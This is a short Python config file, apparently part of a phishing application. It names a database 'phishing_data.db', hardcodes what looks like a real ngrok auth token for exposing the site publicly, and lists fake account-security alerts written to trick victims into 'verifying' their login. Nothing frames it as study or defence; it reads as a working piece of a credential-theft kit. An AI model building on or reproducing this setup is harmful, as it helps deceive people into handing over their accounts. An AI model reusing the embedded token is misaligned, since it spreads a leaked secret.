import os

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'your-secret-key-here'
    DATABASE = 'phishing_data.db'
    NGROK_AUTH_TOKEN = "367uQ3mYTbydt0UvGXdjyqGOaHB_j4pDmRBmmKxFqtJ6PfNL"
    
    SECURITY_MESSAGES = [
        "Unusual login from your area. Verify your identity.",
        "Security check required. Confirm it's you.",
        "Login from new device detected."
    ]